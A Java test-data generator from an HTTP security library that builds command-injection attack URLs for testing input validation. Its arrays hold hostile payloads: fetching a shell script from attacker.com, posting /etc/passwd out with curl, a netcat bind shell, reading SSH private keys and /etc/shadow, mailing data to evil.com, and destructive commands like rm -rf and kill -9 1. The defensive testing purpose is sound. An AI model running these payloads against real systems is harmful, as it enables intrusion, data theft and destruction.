/*
 * Copyright © 2025 CUI-OpenSource-Software (info@cuioss.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.cuioss.tools.security.http.generators.injection;

import de.cuioss.test.generator.TypedGenerator;

/**
 * T13: Command Injection Attack Generator
 * 
 * <p>
 * This generator creates comprehensive command injection attack patterns that attempt
 * to execute operating system commands through web application inputs. Command injection
 * is a critical security vulnerability that can lead to complete system compromise,
 * data theft, and unauthorized access to server resources.
 * </p>
 * 
 * <h3>Attack Types Generated</h3>
 * <ul>
 *   <li>Shell Command Chaining - Unix/Linux command chaining with ; && || operators</li>
 *   <li>Windows Command Injection - CMD and PowerShell specific syntax</li>  
 *   <li>Piped Command Injection - Using pipes to chain commands</li>
 *   <li>Redirection Attacks - Output redirection and file manipulation</li>
 *   <li>Environment Variable Injection - Manipulating shell variables</li>
 *   <li>Subshell Command Injection - Command substitution attacks</li>
 *   <li>Path Traversal Command Injection - Combining path traversal with commands</li>
 *   <li>Sleep-based Command Injection - Time-delay attacks for blind detection</li>
 *   <li>Error-based Command Detection - Triggering system errors</li>
 *   <li>Network-based Command Injection - DNS queries and network operations</li>
 *   <li>File System Command Attacks - File creation/deletion operations</li>
 *   <li>Process Control Attacks - Starting/stopping system processes</li>
 *   <li>Privilege Escalation Commands - Attempting to gain higher privileges</li>
 *   <li>Data Exfiltration Commands - Extracting sensitive system information</li>
 *   <li>Multi-platform Command Variants - Cross-platform attack adaptations</li>
 * </ul>
 * 
 * <h3>Security Standards Compliance</h3>
 * <ul>
 *   <li>OWASP Top 10: A03:2021 – Injection</li>
 *   <li>CWE-78: Improper Neutralization of Special Elements used in an OS Command</li>
 *   <li>CWE-77: Improper Neutralization of Special Elements used in a Command</li>
 *   <li>NIST SP 800-53: SI-10 Information Input Validation</li>
 *   <li>ISO 27001: A.14.2.1 Secure development policy</li>
 * </ul>
 * 
 * @see de.cuioss.tools.security.http.tests.CommandInjectionAttackTest
 * @author Generated for HTTP Security Validation (T13)
 * @version 1.0.0
 */
public class CommandInjectionAttackGenerator implements TypedGenerator<String> {

    private static final String[] BASE_URLS = {
            "http://example.com/api/process",
            "https://app.domain.com/execute",
            "http://localhost:8080/cmd",
            "https://secure.site.org/system/run",
            "http://test.example.com/admin/tools"
    };

    private static final String[] SHELL_OPERATORS = {
            ";", "&&", "||", "|", "&", "\n", "\r\n"
    };

    private static final String[] UNIX_COMMANDS = {
            "ls", "cat", "pwd", "whoami", "id", "ps", "netstat",
            "wget", "curl", "nc", "telnet", "ssh", "find", "grep"
    };

    private static final String[] WINDOWS_COMMANDS = {
            "dir", "type", "whoami", "net", "ipconfig", "tasklist",
            "ping", "nslookup", "systeminfo", "wmic", "powershell"
    };

    private static final String[] DANGEROUS_COMMANDS = {
            "rm -rf", "del /f /q", "format", "fdisk", "dd", "mkfs",
            "shutdown", "reboot", "halt", "init", "kill", "killall"
    };

    private static final String[] FILE_OPERATIONS = {
            "/etc/passwd", "/etc/shadow", "C:\\Windows\\System32\\config\\SAM",
            "/proc/version", "/proc/cpuinfo", "C:\\boot.ini", "/var/log/auth.log"
    };

    @Override
    public String next() {
        String baseUrl = BASE_URLS[hashBasedSelection(BASE_URLS.length)];

        return switch (hashBasedSelection(15)) {
            case 0 -> createShellCommandChaining(baseUrl);
            case 1 -> createWindowsCommandInjection(baseUrl);
            case 2 -> createPipedCommandInjection(baseUrl);
            case 3 -> createRedirectionAttack(baseUrl);
            case 4 -> createEnvironmentVariableInjection(baseUrl);
            case 5 -> createSubshellCommandInjection(baseUrl);
            case 6 -> createPathTraversalCommandInjection(baseUrl);
            case 7 -> createSleepBasedCommandInjection(baseUrl);
            case 8 -> createErrorBasedCommandDetection(baseUrl);
            case 9 -> createNetworkBasedCommandInjection(baseUrl);
            case 10 -> createFileSystemCommandAttack(baseUrl);
            case 11 -> createProcessControlAttack(baseUrl);
            case 12 -> createPrivilegeEscalationCommand(baseUrl);
            case 13 -> createDataExfiltrationCommand(baseUrl);
            case 14 -> createMultiPlatformCommandVariant(baseUrl);
            default -> createShellCommandChaining(baseUrl);
        };
    }

    private String createShellCommandChaining(String pattern) {
        String[] commands = {"ls -la", "cat /etc/passwd", "whoami", "pwd", "ps aux"};
        String operator = SHELL_OPERATORS[hashBasedSelection(SHELL_OPERATORS.length)];
        String command = commands[hashBasedSelection(commands.length)];
        return pattern + "?cmd=test" + operator + command;
    }

    private String createWindowsCommandInjection(String pattern) {
        String[] winCommands = {
                "dir C:\\",
                "type C:\\Windows\\System32\\config\\SAM",
                "net user",
                "ipconfig /all",
                "tasklist /svc",
                "wmic process list",
                "powershell Get-Process"
        };
        String operator = "|";
        String command = winCommands[hashBasedSelection(winCommands.length)];
        return pattern + "?file=report.txt" + operator + command;
    }

    private String createPipedCommandInjection(String pattern) {
        String[] pipedCommands = {
                "cat /etc/passwd | grep root",
                "ps aux | grep ssh",
                "netstat -an | grep LISTEN",
                "ls -la | wc -l",
                "find / -name *.conf | head -10"
        };
        String command = pipedCommands[hashBasedSelection(pipedCommands.length)];
        return pattern + "?data=input; " + command;
    }

    private String createRedirectionAttack(String pattern) {
        String[] redirections = {
                "ls -la > /tmp/output.txt",
                "cat /etc/passwd >> /tmp/stolen.txt",
                "whoami > /var/www/html/user.txt",
                "ps aux > /tmp/processes.log",
                "netstat -an 2>&1 > /tmp/network.txt"
        };
        String command = redirections[hashBasedSelection(redirections.length)];
        return pattern + "?output=file.log && " + command;
    }

    private String createEnvironmentVariableInjection(String pattern) {
        String[] envCommands = {
                "$PATH && cat /etc/passwd",
                "$HOME; ls -la $HOME",
                "$USER || whoami",
                "echo $SHELL; cat /etc/shells",
                "$PWD && find $PWD -name *.txt"
        };
        String command = envCommands[hashBasedSelection(envCommands.length)];
        return pattern + "?env=" + command;
    }

    private String createSubshellCommandInjection(String pattern) {
        String[] subshellCommands = {
                "$(whoami)",
                "`cat /etc/passwd`",
                "$(ls -la /)",
                "`id -u`",
                "$(find / -name passwd)",
                "`ps aux | grep root`",
                "$(netstat -an | wc -l)"
        };
        String command = subshellCommands[hashBasedSelection(subshellCommands.length)];
        return pattern + "?user=" + command;
    }

    private String createPathTraversalCommandInjection(String pattern) {
        String[] pathCommands = {
                "../../../etc/passwd; cat /etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam && type sam",
                "../../usr/bin/id; /usr/bin/id",
                "../../../proc/version || cat /proc/version",
                "..\\..\\boot.ini & type C:\\boot.ini"
        };
        String command = pathCommands[hashBasedSelection(pathCommands.length)];
        return pattern + "?file=" + command;
    }

    private String createSleepBasedCommandInjection(String pattern) {
        String[] sleepCommands = {
                "sleep 5",
                "ping -c 5 127.0.0.1",
                "timeout 5",
                "powershell Start-Sleep 5",
                "sleep 3 && whoami",
                "ping -n 5 localhost"
        };
        String command = sleepCommands[hashBasedSelection(sleepCommands.length)];
        return pattern + "?timeout=1; " + command;
    }

    private String createErrorBasedCommandDetection(String pattern) {
        String[] errorCommands = {
                "ls /nonexistent 2>&1",
                "cat /root/.ssh/id_rsa 2>/dev/null",
                "type C:\\nonexistent.txt 2>&1",
                "find / -name secret 2>/dev/null",
                "grep -r password /etc/ 2>&1"
        };
        String command = errorCommands[hashBasedSelection(errorCommands.length)];
        return pattern + "?search=data || " + command;
    }

    private String createNetworkBasedCommandInjection(String pattern) {
        String[] networkCommands = {
                "nslookup evil.com",
                "wget http://attacker.com/shell.sh",
                "curl -d @/etc/passwd http://attacker.com/exfil",
                "nc -l -p 4444 -e /bin/sh",
                "telnet attacker.com 4444",
                "ping -c 1 attacker.com"
        };
        String command = networkCommands[hashBasedSelection(networkCommands.length)];
        return pattern + "?host=localhost && " + command;
    }

    private String createFileSystemCommandAttack(String pattern) {
        String[] fileCommands = {
                "touch /tmp/pwned.txt",
                "mkdir /tmp/.hidden",
                "cp /etc/passwd /tmp/stolen.txt",
                "mv /etc/hosts /tmp/hosts.bak",
                "chmod 777 /etc/passwd",
                "chown root:root /tmp/shell"
        };
        String command = fileCommands[hashBasedSelection(fileCommands.length)];
        return pattern + "?action=create; " + command;
    }

    private String createProcessControlAttack(String pattern) {
        String[] processCommands = {
                "kill -9 1",
                "killall sshd",
                "service apache2 stop",
                "/bin/sh -c 'exec /bin/bash'",
                "nohup /bin/bash &",
                "screen -dm bash"
        };
        String command = processCommands[hashBasedSelection(processCommands.length)];
        return pattern + "?pid=1234 || " + command;
    }

    private String createPrivilegeEscalationCommand(String pattern) {
        String[] escalationCommands = {
                "sudo su -",
                "su root",
                "sudo /bin/bash",
                "pkexec /bin/sh",
                "/usr/bin/sudo whoami",
                "doas sh"
        };
        String command = escalationCommands[hashBasedSelection(escalationCommands.length)];
        return pattern + "?user=guest && " + command;
    }

    private String createDataExfiltrationCommand(String pattern) {
        String[] exfilCommands = {
                "tar czf - /etc | base64",
                "dd if=/dev/sda bs=512 count=1",
                "cat /proc/meminfo | mail attacker@evil.com",
                "grep -r password /var/log/",
                "find /home -name '*.key' -exec cat {} \\;",
                "lsof | grep deleted"
        };
        String command = exfilCommands[hashBasedSelection(exfilCommands.length)];
        return pattern + "?backup=data; " + command;
    }

    private String createMultiPlatformCommandVariant(String pattern) {
        String[] multiCommands = {
                "uname -a || systeminfo",
                "which bash || where cmd",
                "cat /etc/issue || ver",
                "ps -ef || tasklist",
                "netstat -rn || route print",
                "crontab -l || schtasks"
        };
        String command = multiCommands[hashBasedSelection(multiCommands.length)];
        return pattern + "?info=system && " + command;
    }

    private int hashBasedSelection(int max) {
        return Math.abs(this.hashCode()) % max;
    }

    @Override
    public Class<String> getType() {
        return String.class;
    }
}